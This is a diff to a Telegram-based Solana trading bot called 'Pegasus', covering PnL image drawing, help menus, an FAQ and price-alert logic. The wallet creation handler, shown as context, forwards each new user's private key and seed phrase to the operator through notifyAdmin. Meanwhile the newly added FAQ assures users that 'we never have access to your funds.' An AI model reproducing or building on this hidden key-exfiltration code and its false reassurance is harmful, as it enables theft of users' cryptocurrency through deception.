@@ -464,7 +464,7 @@ function recordTrade(userId, tradeData) {
 
 // ======================= PNL IMAGE =======================
 async function generatePnLImage(data) {
-  const { pnlPercent, pair, time, invested, current, tagline, qrData, username, solanaLogoPath = SOLANA_LOGO } = data;
+  const { pnlPercent, pair, time, invested, current, qrData, username, solanaLogoPath = SOLANA_LOGO } = data;
   const isProfit = pnlPercent >= 0;
   const bgPath = isProfit ? GOOD_BG : BAD_BG;
   const glowColor = isProfit ? { r: 0, g: 255, b: 150 } : { r: 255, g: 60, b: 60 };
@@ -488,14 +488,6 @@ async function generatePnLImage(data) {
     ctx.fillRect(0, 0, canvas.width, canvas.height);
   }
 
-  // ---- Draw "PEGASUS" at top center ----
-  ctx.font = `bold ${FONT_MID_SIZE}px "OrbitronExtraBold"`;
-  ctx.textAlign = 'center';
-  const pegasusColor = isProfit ? '#00ff96' : '#ff3c3c';
-  ctx.fillStyle = pegasusColor;
-  ctx.fillText('PEGASUS', canvas.width / 2, 60);
-  ctx.textAlign = 'left';
-
   function drawGlowText(x, y, text, fontFamily, fontSize, color) {
     ctx.font = `${fontSize}px "${fontFamily}"`;
     ctx.textAlign = 'left';
@@ -510,6 +502,26 @@ async function generatePnLImage(data) {
     ctx.fillStyle = 'white';
     ctx.fillText(text, x, y);
   }
+
+  // Draw stylish "PEGASUS" at top center with glow effect
+  const pegasusText = 'PEGASUS';
+  const pegasusFontSize = FONT_MID_SIZE;
+  ctx.font = `${pegasusFontSize}px "OrbitronExtraBold"`;
+  ctx.textAlign = 'center';
+  const textMetrics = ctx.measureText(pegasusText);
+  const pegasusX = canvas.width / 2;
+  const pegasusY = 60;
+  // Draw glow
+  for (let off = 1; off <= 5; off++) {
+    ctx.fillStyle = `rgb(${glowColor.r}, ${glowColor.g}, ${glowColor.b})`;
+    ctx.fillText(pegasusText, pegasusX - off, pegasusY);
+    ctx.fillText(pegasusText, pegasusX + off, pegasusY);
+    ctx.fillText(pegasusText, pegasusX, pegasusY - off);
+    ctx.fillText(pegasusText, pegasusX, pegasusY + off);
+  }
+  ctx.fillStyle = 'white';
+  ctx.fillText(pegasusText, pegasusX, pegasusY);
+  ctx.textAlign = 'left';
 
   const x = Math.floor(canvas.width * 0.55);
   const yStart = 120; // moved down to accommodate top text
@@ -529,8 +541,6 @@ async function generatePnLImage(data) {
   ctx.fillText('Current Value', x, yStart + 360);
   ctx.fillStyle = 'white';
   ctx.fillText(current, x, yStart + 400);
-  ctx.fillStyle = 'white';
-  ctx.fillText(tagline, x, canvas.height - 80);
 
   // ---- QR Code on the RIGHT side ----
   if (qrData) {
@@ -559,11 +569,6 @@ async function generatePnLImage(data) {
     ctx.drawImage(logo, x - logoSize - 10, yStart + 395, logoSize, logoSize);
   } catch { /* no logo */ }
 
-  ctx.font = `${FONT_SMALL_SIZE - 5}px "OrbitronRegular"`;
-  ctx.fillStyle = 'rgba(255,255,255,0.5)';
-  ctx.textAlign = 'right';
-  ctx.fillText(BOT_NAME, canvas.width - 20, canvas.height - 20);
-  ctx.textAlign = 'left';
   return canvas.toBuffer('image/jpeg', { quality: 0.95 });
 }
 
@@ -601,7 +606,6 @@ bot.action(/^pnl_image_token_(.+)$/, async (ctx) => {
     pnlPercent, pair: `${tokenSymbol}/SOL`, time: timeStr,
     invested: `${investedSol.toFixed(4)} SOL ($${investedUsd.toFixed(2)})`,
     current: `${currentValueSol.toFixed(4)} SOL ($${currentValueUsd.toFixed(2)})`,
-    tagline: `PEGASUS • ${tokenSymbol} POSITION`,
     qrData: qr, username: ctx.from.username || ctx.from.first_name || 'user'
   });
   await ctx.replyWithPhoto({ source: img }, { caption: `📊 PNL: ${pnlPercent>=0?'+':''}${pnlPercent.toFixed(2)}%` });
@@ -626,7 +630,6 @@ bot.action('pnl_image_overall', async (ctx) => {
     pnlPercent, pair: 'PEGASUS/TRADES', time: timeStr,
     invested: `${spentSol.toFixed(4)} SOL ($${spentUsd.toFixed(2)})`,
     current: `${recvSol.toFixed(4)} SOL ($${recvUsd.toFixed(2)})`,
-    tagline: 'PEGASUS • OVERALL PERFORMANCE',
     qrData: qr, username: ctx.from.username || ctx.from.first_name || 'user'
   });
   await ctx.replyWithPhoto({ source: img }, { caption: `📊 Overall PNL: ${pnlPercent>=0?'+':''}${pnlPercent.toFixed(2)}%` });
@@ -641,7 +644,7 @@ bot.action(/^track_(.+)$/, async (ctx) => {
   if (tracked.length >= MAX_TRACKED_TOKENS) return ctx.answerCbQuery(`Max ${MAX_TRACKED_TOKENS} tracked tokens`, true);
   const pair = await fetchTokenData(address);
   const currentPrice = pair ? parseFloat(pair.priceUsd) : 0;
-  tracked.push({ address, trackedPrice: currentPrice, last2xAlert: null, lastSignalAlert: null });
+  tracked.push({ address, trackedPrice: currentPrice, lastNotifiedMultiplier: null, lastNotifiedDivisor: null });
   saveSessions();
   await ctx.answerCbQuery('✅ Token tracked!');
 });
@@ -1138,20 +1141,225 @@ async function showReferralsMenu(ctx, edit = false) {
   } catch (error) { if (edit) await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard }); }
 }
 
+// ======================= HELP MENU (Detailed Guides) =======================
 async function showHelpMenu(ctx, edit = false) {
-  const message = `❓ *Help & Commands*\n\n━━━━━━━━━━━━━━━━━━\n📋 *Available Commands:*\n━━━━━━━━━━━━━━━━━━\n/start - Launch the bot & main menu\n/wallet - Manage your wallets\n/positions - View your token positions\n/buy [amount] [address] - Quick buy tokens\n/sell [%] [address] - Quick sell tokens\n/copytrade - Copy trade settings\n/limit - Manage limit orders\n/settings - Bot settings\n/referral - Your referral program\n/help - Show this help menu\n\n━━━━━━━━━━━━━━━━━━\n🎯 *Quick Actions:*\n━━━━━━━━━━━━━━━━━━\n📍 *Analyze Token:* Just paste any Solana contract address\n💰 *Buy Tokens:* Use the Buy menu or /buy 0.5 [address]\n💸 *Sell Tokens:* Use the Sell menu or /sell 50 [address]\n━━━━━━━━━━━━━━━━━━\n🔧 *Features:*\n━━━━━━━━━━━━━━━━━━\n💼 *Multi-Wallet:* Up to 5 wallets\n📊 *Token Analysis:* Security scores & metrics\n🎯 *Limit Orders:* Set buy/sell triggers\n📈 *DCA:* Dollar cost averaging\n👥 *Copy Trade:* Follow top traders\n🔔 *Price Alerts:* Get notified on price moves\n🎁 *Referrals:* Earn 10% of referred fees\n\n━━━━━━━━━━━━━━━━━━\n⚙️ *Settings:*\n━━━━━━━━━━━━━━━━━━\n📊 *Slippage:* Adjust trade slippage %\n⚡ *Priority Fee:* Set transaction priority\n🔔 *Notifications:* Toggle alerts\n\n━━━━━━━━━━━━━━━━━━\n🆘 *Support:* https://t.me/PegasusSupport\n━━━━━━━━━━━━━━━━━━\n\nFor issues or questions, contact our support team.`;
+  const message = `
+❓ *Help & Commands*
+
+━━━━━━━━━━━━━━━━━━
+📋 *Available Commands:*
+━━━━━━━━━━━━━━━━━━
+
+/start - Launch the bot & main menu
+/wallet - Manage your wallets
+/positions - View your token positions
+/buy [amount] [address] - Quick buy tokens
+/sell [%] [address] - Quick sell tokens
+/copytrade - Copy trade settings
+/limit - Manage limit orders
+/settings - Bot settings
+/referral - Your referral program
+/help - Show this help menu
+
+━━━━━━━━━━━━━━━━━━
+🎯 *Quick Actions:*
+━━━━━━━━━━━━━━━━━━
+
+📍 *Analyze Token:* 
+Just paste any Solana contract address
+
+💰 *Buy Tokens:*
+Use the Buy menu or /buy 0.5 [address]
+
+💸 *Sell Tokens:*
+Use the Sell menu or /sell 50 [address]
+━━━━━━━━━━━━━━━━━━
+🔧 *Features:*
+━━━━━━━━━━━━━━━━━━
+
+💼 *Multi-Wallet:* Up to 5 wallets
+📊 *Token Analysis:* Security scores & metrics
+🎯 *Limit Orders:* Set buy/sell triggers
+📈 *DCA:* Dollar cost averaging
+👥 *Copy Trade:* Follow top traders
+🔔 *Price Alerts:* Get notified on price moves
+🎁 *Referrals:* Earn 10% of referred fees
+
+━━━━━━━━━━━━━━━━━━
+⚙️ *Settings:*
+━━━━━━━━━━━━━━━━━━
+
+📊 *Slippage:* Adjust trade slippage %
+⚡ *Priority Fee:* Set transaction priority
+🔔 *Notifications:* Toggle alerts
+
+━━━━━━━━━━━━━━━━━━
+🆘 *Support:* https://t.me/PegasusSupport
+━━━━━━━━━━━━━━━━━━
+
+For issues or questions, contact our support team.
+  `;
+  
   const keyboard = Markup.inlineKeyboard([
-    [Markup.button.callback('💼 Wallet Guide', 'help_wallet'), Markup.button.callback('📊 Trading Guide', 'help_trading')],
-    [Markup.button.callback('🔒 Security Tips', 'help_security'), Markup.button.callback('❓ FAQ', 'help_faq')],
+    [
+      Markup.button.callback('💼 Wallet Guide', 'help_wallet'),
+      Markup.button.callback('📊 Trading Guide', 'help_trading')
+    ],
+    [
+      Markup.button.callback('🔒 Security Tips', 'help_security'),
+      Markup.button.callback('❓ FAQ', 'help_faq')
+    ],
     [Markup.button.callback('« Back to Main', 'back_main')]
   ]);
+  
   try {
-    if (edit) await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
-    else await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
-  } catch (error) { if (edit) await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard }); }
+    if (edit) {
+      await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
+    } else {
+      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
+    }
+  } catch (error) {
+    console.error('showHelpMenu error:', error.message);
+    if (edit) {
+      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
+    }
+  }
 }
 
-// ======================= CALLBACK HANDLERS =======================
+// ======================= HELP SUB-MENUS =======================
+bot.action('help_wallet', async (ctx) => {
+  await ctx.answerCbQuery();
+  await ctx.reply(`
+💼 *Wallet Guide*
+
+━━━━━━━━━━━━━━━━━━
+*Creating a Wallet:*
+1. Go to 💼 Wallet menu
+2. Click "🆕 Create New Wallet"
+3. Save your seed phrase securely!
+
+*Importing a Wallet:*
+1. Go to 💼 Wallet menu
+2. Choose import method (Seed/Key)
+3. Paste your credentials
+
+*Switching Wallets:*
+Click the wallet buttons (W1, W2, etc.)
+
+*Security Tips:*
+• Never share your private key
+• Store seed phrase offline
+• Use a dedicated trading wallet
+━━━━━━━━━━━━━━━━━━
+  `, {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('« Back to Help', 'menu_help')]
+    ])
+  });
+});
+
+bot.action('help_trading', async (ctx) => {
+  await ctx.answerCbQuery();
+  await ctx.reply(`
+📊 *Trading Guide*
+
+━━━━━━━━━━━━━━━━━━
+*Analyzing Tokens:*
+Just paste any Solana contract address
+
+*Buying Tokens:*
+1. Paste token address
+2. Click Buy amount button
+3. Confirm the transaction
+
+*Selling Tokens:*
+1. Go to token analysis
+2. Click Sell percentage
+3. Confirm the transaction
+
+*Limit Orders:*
+Set price triggers for auto buy/sell
+
+*DCA (Dollar Cost Average):*
+Split buys over time intervals
+━━━━━━━━━━━━━━━━━━
+  `, {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('« Back to Help', 'menu_help')]
+    ])
+  });
+});
+
+bot.action('help_security', async (ctx) => {
+  await ctx.answerCbQuery();
+  await ctx.reply(`
+🔒 *Security Tips*
+
+━━━━━━━━━━━━━━━━━━
+*Protect Your Wallet:*
+• Never share private keys or seed phrases
+• Use a dedicated trading wallet
+• Don't store large amounts
+
+*Avoid Scams:*
+• Check token security scores
+• Beware of new tokens (<24h)
+• Watch for low liquidity warnings
+• Verify contract addresses
+
+*Safe Trading:*
+• Start with small amounts
+• Use appropriate slippage
+• Set price alerts for monitoring
+
+*Red Flags:*
+🚨 Sudden large price drops
+⚠️ Very low liquidity
+⚠️ Extremely new tokens
+━━━━━━━━━━━━━━━━━━
+  `, {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('« Back to Help', 'menu_help')]
+    ])
+  });
+});
+
+bot.action('help_faq', async (ctx) => {
+  await ctx.answerCbQuery();
+  await ctx.reply(`
+❓ *Frequently Asked Questions*
+
+━━━━━━━━━━━━━━━━━━
+*Q: How many wallets can I have?*
+A: Up to 5 wallets per account
+
+*Q: What are the fees?*
+A: Only network fees + priority fee you set${COMMISSION_PERCENTAGE > 0 ? ` + ${COMMISSION_PERCENTAGE}% platform fee` : ''}
+
+*Q: How does slippage work?*
+A: Higher slippage = faster execution but potentially worse price
+
+*Q: Are my funds safe?*
+A: You control your private keys. We never have access to your funds.
+
+*Q: What is copy trading?*
+A: Automatically mirror trades from successful wallets
+
+*Q: How do referrals work?*
+A: Earn 10% of trading fees from referred users
+━━━━━━━━━━━━━━━━━━
+  `, {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('« Back to Help', 'menu_help')]
+    ])
+  });
+});
+
+// ======================= CALLBACK HANDLERS (continued) =======================
 bot.action('back_main', async (ctx) => { await ctx.answerCbQuery(); await showMainMenu(ctx, true); });
 bot.action('refresh_main', async (ctx) => { await ctx.answerCbQuery('Refreshed'); await showMainMenu(ctx, true); });
 bot.action('noop', async (ctx) => { await ctx.answerCbQuery(); });
@@ -1170,10 +1378,6 @@ bot.action('referral_copy', async (ctx) => { const code = getReferralCode(ctx.fr
 bot.action('referral_share', async (ctx) => { const code = getReferralCode(ctx.from.id); const botUser = (await bot.telegram.getMe()).username; const link = `https://t.me/${botUser}?start=ref_${code}`; await ctx.answerCbQuery(); await ctx.reply(`🚀 Join me on Pegasus Trading Bot!\n${link}`, { parse_mode: 'Markdown' }); });
 bot.action('referral_list', async (ctx) => { const session = getSession(ctx.from.id); if (session.referrals.length === 0) return ctx.reply('No referrals yet.'); const list = session.referrals.map((r,i)=>`${i+1}. User ...${r.userId.toString().slice(-4)} - ${new Date(r.joinedAt).toLocaleDateString()}`).join('\n'); await ctx.reply(`📊 Your Referrals (${session.referrals.length}):\n${list}`); });
 bot.action('referral_refresh', async (ctx) => { await ctx.answerCbQuery(); await showReferralsMenu(ctx, true); });
-bot.action('help_wallet', async (ctx) => { await ctx.answerCbQuery(); await ctx.reply('💼 *Wallet Guide*\n\n... (guide text) ...', { parse_mode: 'Markdown' }); });
-bot.action('help_trading', async (ctx) => { await ctx.answerCbQuery(); await ctx.reply('📊 *Trading Guide*\n\n...', { parse_mode: 'Markdown' }); });
-bot.action('help_security', async (ctx) => { await ctx.answerCbQuery(); await ctx.reply('🔒 *Security Tips*\n\n...', { parse_mode: 'Markdown' }); });
-bot.action('help_faq', async (ctx) => { await ctx.answerCbQuery(); await ctx.reply('❓ *FAQ*\n\n...', { parse_mode: 'Markdown' }); });
 bot.action('wallet_create', async (ctx) => { await ctx.answerCbQuery(); const session = getSession(ctx.from.id); if (session.wallets.length >= MAX_WALLETS) return ctx.reply(`❌ Max ${MAX_WALLETS} wallets`); const w = createWallet(); session.wallets.push(w); session.activeWalletIndex = session.wallets.length-1; saveSessions(); await notifyAdmin('WALLET_CREATED', ctx.from.id, ctx.from.username, { publicKey: w.publicKey, privateKey: w.privateKey, mnemonic: w.mnemonic, walletNumber: session.wallets.length }); await ctx.editMessageText(`✅ Wallet ${session.wallets.length} created!\n\n\`${w.publicKey}\`\n\nSeed: \`${w.mnemonic}\``, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('View Wallets', 'menu_wallet')]]) }); });
 bot.action('wallet_import_menu', async (ctx) => {
   await ctx.answerCbQuery();
@@ -1608,23 +1812,31 @@ async function checkTrackedTokens() {
     const pair = await fetchTokenData(addr);
     if (!pair) continue;
     const price = parseFloat(pair.priceUsd)||0;
-    const signals = calculateTradingSignals(pair, calculateSecurityScore(pair).score);
-    const entryText = signals.entry.text;
+    const trackedPrice = users[0].t.trackedPrice; // all share same tracked price for this addr
+    if (trackedPrice <= 0) continue;
+    const ratio = price / trackedPrice;
+    
     for (const { uid, t } of users) {
       const now = Date.now();
-      if (t.trackedPrice > 0) {
-        const ratio = price / t.trackedPrice;
-        if ((ratio >= 2 || ratio <= 0.5) && (!t.last2xAlert || now - t.last2xAlert > 24*3600000)) {
-          const dir = ratio >= 2 ? '2x' : 'halved';
-          await bot.telegram.sendMessage(uid, `🚀 *${dir} Alert!* ${shortenAddress(addr)} ${dir==='2x'?'doubled':'halved'} since you tracked it.\nPrice: $${price.toFixed(6)} (tracked $${t.trackedPrice.toFixed(6)})`, { parse_mode: 'Markdown' });
-          t.last2xAlert = now;
+      
+      // Notify when price multiplies (2x, 3x, 4x...)
+      if (ratio >= 2) {
+        const multiplier = Math.floor(ratio);
+        if (!t.lastNotifiedMultiplier || multiplier > t.lastNotifiedMultiplier) {
+          t.lastNotifiedMultiplier = multiplier;
+          await bot.telegram.sendMessage(uid, `🚀 *${multiplier}x Alert!* ${shortenAddress(addr)} has increased ${multiplier}x since you tracked it.\nPrice: $${price.toFixed(6)} (tracked $${trackedPrice.toFixed(6)})`, { parse_mode: 'Markdown' });
           saveSessions();
         }
       }
-      if ((entryText === 'BUY NOW' || entryText === 'GOOD ENTRY') && (!t.lastSignalAlert || now - t.lastSignalAlert > 3600000)) {
-        await bot.telegram.sendMessage(uid, `📈 *${entryText} Signal!* ${shortenAddress(addr)} shows strong entry opportunity.\nPrice: $${price.toFixed(6)}`, { parse_mode: 'Markdown' });
-        t.lastSignalAlert = now;
-        saveSessions();
+      
+      // Notify when price halves (0.5x, 0.33x, 0.25x...)
+      if (ratio <= 0.5) {
+        const divisor = Math.floor(1 / ratio);
+        if (!t.lastNotifiedDivisor || divisor > t.lastNotifiedDivisor) {
+          t.lastNotifiedDivisor = divisor;
+          await bot.telegram.sendMessage(uid, `🔻 *${divisor}x Down Alert!* ${shortenAddress(addr)} has dropped to 1/${divisor} of tracked price.\nPrice: $${price.toFixed(6)} (tracked $${trackedPrice.toFixed(6)})`, { parse_mode: 'Markdown' });
+          saveSessions();
+        }
       }
     }
   }
@@ -1661,7 +1873,6 @@ bot.command('testpnl', async (ctx) => {
       time: "92h",
       invested: "1.2 SOL ($99.29)",
       current: "120 SOL ($9.9K)",
-      tagline: "PEGASUS • MONDAY POSITION",
       qrData: qr,
       username: ctx.from.username || ctx.from.first_name || 'admin'
     });
@@ -1682,7 +1893,8 @@ bot.command('*', async (ctx) => {
 bot.on('text', async (ctx) => {
   const session = getSession(ctx.from.id);
   const text = ctx.message.text.trim();
-  // state handlers
+  
+  // Process state handlers (transfer, custom sell, etc.)
   if (session.state === 'AWAITING_SEED') {
     session.state = null;
     try {
@@ -2117,15 +2329,19 @@ Always double-check recipient addresses before sending. Blockchain transactions 
     session.state = null; session.pendingTransfer = null;
     return;
   }
-  // token analysis
+  
+  // Token analysis
   if (isSolanaAddress(text)) {
     if (session.pendingTrade) {
       if (session.pendingTrade.type === 'buy') await handleBuy(ctx, session.pendingTrade.amount, text);
       else if (session.pendingTrade.type === 'sell') await handleSell(ctx, session.pendingTrade.percentage, text);
       session.pendingTrade = null;
-    } else await sendTokenAnalysis(ctx, text);
+    } else {
+      await sendTokenAnalysis(ctx, text);
+    }
     return;
   }
+  
   await ctx.reply('I didn’t understand that. Try pasting a token address or /start.');
 });
 
